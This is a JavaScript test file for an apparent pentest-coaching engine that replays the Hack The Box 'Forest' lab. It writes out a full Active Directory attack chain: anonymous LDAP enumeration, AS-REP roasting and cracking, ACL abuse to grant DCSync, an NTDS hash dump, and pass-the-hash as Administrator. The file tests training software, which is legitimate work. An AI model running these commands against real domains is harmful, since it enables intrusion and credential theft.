/* Forest end-to-end REPLAY: the command -> real output -> fact -> advance/retire round-trip, the loop the
 * operator actually runs, replayed stage by stage against the REAL coach (OBOL.pack.rankActions + the
 * command filler + loot output-path resolution). Every other ranking test asks "given these facts, what
 * ranks"; this one drives realistic tool OUTPUT through the parser and checks that each paste mints the
 * right fact AND that the next move / command the operator needs is the one obol leads with. It encodes the
 * bugs found on real Forest runs so they cannot silently come back:
 *   - a two-read evil-winrm paste captures BOTH the user flag (local) and the root flag (root);
 *   - a `bloodyAD get writable` paste mints ad.acl_lead, RETIRES the get-writable command, and the derived
 *     {{group}} is the highest-value writable group (Exchange Windows Permissions), from parsed data, not
 *     a hardcoded lab answer;
 *   - Manual AD Path-Finding leads with a path-finder (daclread), not the admin-count check that hung.
 * Data mirrors HTB Forest (htb.local) because the round-trip bugs were found there; the PIPELINE is generic.
 */
'use strict';
var fs = require('fs'), path = require('path'), vm = require('vm');
var ROOT = path.join(__dirname, '..', '..'), ENG = path.join(ROOT, 'assets', 'engine');
var ctx = { console: { log: function () {}, warn: function () {}, error: function () {} } }; ctx.globalThis = ctx; vm.createContext(ctx);
function load(f) { vm.runInContext(fs.readFileSync(f, 'utf8'), ctx, { filename: f }); }
['facts.js', 'phases.js', 'pack.js', 'packs.js', 'command.js', 'workspace.js', 'profile.js', 'loot.js'].forEach(function (f) { try { load(path.join(ENG, f)); } catch (e) {} });
load(path.join(ENG, 'parsers', 'common.js'));
['nmap', 'directory', 'creds', 'host', 'web', 'services', 'database', 'websource'].forEach(function (m) { load(path.join(ENG, 'parsers', m + '.js')); });
load(path.join(ENG, 'parsers', 'index.js'));
load(path.join(ROOT, 'data', 'packs-bundle.js'));
var OBOL = ctx.OBOL;

var fail = 0;
function ok(cond, msg) { if (!cond) { console.error('  FAIL:', msg); fail++; } else { console.log('  ok  :', msg); } }

var DOM = 'htb.local', TGT = '10.129.10.10', SCOPE = 'host:' + TGT;
var pack = OBOL.packs.actions();
var facts = new OBOL.facts.FactSet([OBOL.facts.makeFact({ kind: 'target.configured', scope: SCOPE, source: 'eng' })]);
// the engagement params the live filler reads (target + the escalated identity as it is learned)
var params = { target: TGT, domain: '', username: '', password: '', nthash: '' };

function ingest(command, stdout) {
  var r = OBOL.parsers.parseActionOutput({ actionId: '', command: command, stdout: stdout, source: 'sim', scope: SCOPE, domain: DOM });
  var minted = {};
  (r.facts || []).forEach(function (f) { if (facts.add(OBOL.facts.factFromJson(OBOL.facts.factToJson(f)))) minted[f.kind] = 1; });
  return minted;
}
function ready() { return OBOL.pack.rankActions(facts, pack, {}); }
function readyIds() { return ready().map(function (a) { return a.id; }); }
function topId() { return (ready()[0] || {}).id; }
function moveById(id) { return pack.filter(function (a) { return a.id === id; })[0]; }
// the command the operator would SEE lead a move: its first non-settled, non-gated command (mirrors the
// UI's visible list, which hides settled/gated commands in pack order).
function leadCmd(move) {
  var filled = OBOL.command.fillAll(move, facts, { params: params, profile: {}, workspace: {} });
  for (var i = 0; i < (move.commands || []).length; i++) {
    if (OBOL.pack.commandSettled(move.commands[i], facts)) continue;
    var run = (filled[i] && filled[i].filled) || '';
    if (/\{\{(domain|basedn|userlist|hashfile|krbtgt_hash|dahash|dauser|group|domain_sid|target_sam)\}\}/.test(run)) continue; // gated token unfilled
    return run;
  }
  return '';
}

// ── 1. Recon: full-port nmap of the DC ─────────────────────────────────────────────────────────
ingest('nmap -Pn -p- ' + TGT, ['Nmap scan report for ' + TGT, 'Host is up.',
  '53/tcp open domain', '88/tcp open kerberos-sec', '135/tcp open msrpc', '139/tcp open netbios-ssn',
  '389/tcp open ldap', '445/tcp open microsoft-ds', '464/tcp open kpasswd5', '593/tcp open http-rpc-epmap',
  '636/tcp open ldapssl', '3268/tcp open globalcatLDAP', '5985/tcp open wsman', '9389/tcp open adws', 'Nmap done'].join('\n'));
ok(facts.has('ldap.reachable') && facts.has('smb.reachable') && facts.has('kerberos.reachable'), '1 recon: nmap mints the AD service surface');
ok(ready().slice(0, 3).some(function (a) { return /^ad-(anon-ldap-enum|dc-identify|user-enum)$/.test(a.id); }), '1 recon: an AD orient move leads (top 3)');

// ── 2. Anonymous LDAP bind, then the user list ─────────────────────────────────────────────────
ingest("nxc ldap " + TGT + " -u '' -p ''", 'LDAP ' + TGT + ' 389 FOREST [*] (name:FOREST) (domain:' + DOM + ') (signing:None)\nLDAP ' + TGT + ' 389 FOREST [+] ' + DOM + '\\: ');
ok(facts.has('ad.anonymous_bind'), '2 enum: a successful anonymous LDAP bind mints ad.anonymous_bind');
var u = ["nxc ldap " + TGT + " -u '' -p '' --users",
  'LDAP ' + TGT + ' 389 FOREST [+] ' + DOM + '\\: ',
  'LDAP ' + TGT + ' 389 FOREST [*] Enumerated 31 domain users: ' + DOM,
  'LDAP ' + TGT + ' 389 FOREST Administrator', 'LDAP ' + TGT + ' 389 FOREST sebastien',
  'LDAP ' + TGT + ' 389 FOREST svc-alfresco', 'LDAP ' + TGT + ' 389 FOREST andy', 'LDAP ' + TGT + ' 389 FOREST mark'];
ingest(u[0], u.slice(1).join('\n'));
ok(facts.has('ad.user_list'), '2 enum: anonymous LDAP --users mints the domain user list');
ok(readyIds().indexOf('asrep-roast') >= 0, '2 enum: AS-REP roast becomes a ready move once a user list exists');

// ── 3. AS-REP roast, then crack ────────────────────────────────────────────────────────────────
ingest("nxc ldap " + TGT + " -u users.txt -p '' --asreproast asrep.hashes",
  '$krb5asrep$23$svc-alfresco@HTB.LOCAL:' + new Array(33).join('a') + '$' + new Array(200).join('b'));
ok(facts.has('hash.asrep'), '3 creds: AS-REP roasting captures a roastable hash');
ok(readyIds().indexOf('crack-asrep') >= 0, '3 creds: cracking the AS-REP hash becomes a ready move');
ingest('hashcat -m 18200 asrep.hashes rockyou.txt', '$krb5asrep$23$svc-alfresco@HTB.LOCAL:' + new Array(33).join('a') + '$dead:s3rvice');
ok(facts.has('credential.available'), '3 creds: the crack yields a usable credential (svc-alfresco)');
params.username = 'svc-alfresco'; params.password = 's3rvice'; params.domain = DOM;

// ── 4. Validate the credential ─────────────────────────────────────────────────────────────────
ingest("nxc smb " + TGT + " -u svc-alfresco -p 's3rvice'", 'SMB ' + TGT + ' 445 FOREST [*] Windows Server 2016 (name:FOREST) (domain:' + DOM + ') (signing:True)\nSMB ' + TGT + ' 445 FOREST [+] ' + DOM + '\\svc-alfresco:s3rvice ');
ok(facts.has('credential.validated'), '4 access: a successful SMB login validates the credential');

// ── 5. Manual AD Path-Finding must LEAD with a path-finder, not the admin-count check that hung ──
var apm = moveById('ad-path-manual');
ok(readyIds().indexOf('ad-path-manual') >= 0, '5 path: Manual AD Path-Finding is a ready move on a validated credential');
ok(apm && /daclread|get writable/i.test((apm.commands[0] || {}).run || ''), '5 path: its FIRST command is a path-finder (daclread / get writable), not --admin-count');
ok(apm && !/--admin-count/.test((apm.commands[0] || {}).run || ''), '5 path: --admin-count no longer leads the move (it hung on a real box)');
ok(/daclread|get writable/i.test(leadCmd(apm)), '5 path: the command the operator SEES lead is a path-finder');

// ── 6. get writable -> ad.acl_lead, the command RETIRES, and {{group}} derives from parsed data ──
var gw = (apm.commands || []).filter(function (c) { return /get writable/i.test(c.run || ''); })[0];
ok(gw && !OBOL.pack.commandSettled(gw, facts), '6 round-trip: before the paste, the get-writable command is live');
ingest("bloodyAD -d " + DOM + " --host " + TGT + " -u svc-alfresco -p 's3rvice' get writable --detail", [
  'distinguishedName: CN=Allowed RODC Password Replication Group,CN=Users,DC=htb,DC=local', 'msExchIMAddress: WRITE', '',
  'distinguishedName: CN=Exchange Windows Permissions,CN=Users,DC=htb,DC=local', 'member: WRITE', '',
  'distinguishedName: CN=DnsAdmins,CN=Users,DC=htb,DC=local', 'member: WRITE'].join('\n'));
ok(facts.has('ad.acl_lead'), '6 round-trip: the get-writable output mints ad.acl_lead (not discarded)');
ok(OBOL.pack.commandSettled(gw, facts), '6 round-trip: ad.acl_lead RETIRES the get-writable command (no silent re-offer)');
var leadVals = facts.values('ad.acl_lead') || [];
var tgts = (leadVals[0] && leadVals[0].targets) || [];
ok(tgts.indexOf('Exchange Windows Permissions') >= 0, '6 round-trip: the parsed writable targets include Exchange Windows Permissions (from the output, not hardcoded)');
// the ACL-abuse move's single-group add fills {{group}} from the parsed lead, ranked by value
var abuse = moveById('bloodyad-acl') || moveById('ad-acl-abuse');
if (abuse) {
  var af = OBOL.command.fillAll(abuse, facts, { params: params, profile: {}, workspace: {} });
  var addCmd = af.map(function (x) { return (x && x.filled) || ''; }).filter(function (r) { return /add groupMember "/.test(r) && !/for g in/.test(r); })[0] || '';
  ok(/add groupMember "Exchange Windows Permissions"/.test(addCmd), '6 round-trip: {{group}} derives to Exchange Windows Permissions (highest-value writable), not Domain Admins');
} else { ok(false, '6 round-trip: ACL-abuse move present'); }

// ── 7. Join the group, grant DCSync, dump NTDS ─────────────────────────────────────────────────
ingest("bloodyAD -d " + DOM + " --host " + TGT + " -u svc-alfresco -p 's3rvice' add groupMember \"Exchange Windows Permissions\" svc-alfresco", '[+] svc-alfresco added to Exchange Windows Permissions');
ok(facts.has('ad.group_joined'), '7 escalate: the group add mints ad.group_joined');
ingest("bloodyAD -d " + DOM + " --host " + TGT + " -u svc-alfresco -p 's3rvice' add dcsync svc-alfresco", '[+] svc-alfresco is now able to DCSync');
ok(facts.has('ad.control_paths'), '7 escalate: the DCSync grant mints ad.control_paths');
ingest("nxc smb " + TGT + " -u svc-alfresco -p 's3rvice' --ntds", ['SMB ' + TGT + ' 445 FOREST [+] ' + DOM + '\\svc-alfresco:s3rvice ',
  'SMB ' + TGT + ' 445 FOREST [+] Dumping the NTDS',
  'SMB ' + TGT + ' 445 FOREST ' + DOM + '\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::',
  'SMB ' + TGT + ' 445 FOREST krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::'].join('\n'));
ok(facts.has('loot.ntds'), '7 loot: the NTDS dump mints loot.ntds (every domain hash)');

// ── 8. Own the domain via Pass-the-Hash as Administrator ────────────────────────────────────────
ok(readyIds().indexOf('own-domain-pth') >= 0, '8 own: Pass-the-Hash as the recovered DA is a ready move after the NTDS dump');
ingest('nxc smb ' + TGT + ' -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6', 'SMB ' + TGT + ' 445 FOREST [+] ' + DOM + '\\Administrator:32693b11e6aa90eb43d32c72a07ceea6 (Pwn3d!)');
ok(facts.has('access.admin'), '8 own: the PtH login mints administrative access (Pwn3d!)');

// ── 9. Capture BOTH flags from one evil-winrm paste (the two-read round-trip) ───────────────────
ingest('', [
  '*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> hostname; ipconfig; type C:\\Users\\svc-alfresco\\Desktop\\user.txt',
  'FOREST', '   IPv4 Address. . . . . . . . . . . : ' + TGT,
  'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
  '*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> whoami; hostname; type C:\\Users\\Administrator\\Desktop\\root.txt',
  'htb\\administrator', 'FOREST',
  'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb'].join('\n'));
ok(facts.has('objective.local_flag'), '9 flags: the user.txt read captures the LOCAL flag');
ok(facts.has('objective.root_flag'), '9 flags: the root.txt read in the SAME paste captures the ROOT flag (not collapsed onto local)');

console.log(fail ? ('\nFOREST E2E REPLAY: ' + fail + ' FAILURES') : '\nFOREST E2E REPLAY: all passed, recon -> user list -> roast -> crack -> validate -> path-find -> ACL abuse -> DCSync -> NTDS -> PtH -> both flags');
process.exit(fail ? 1 : 0);
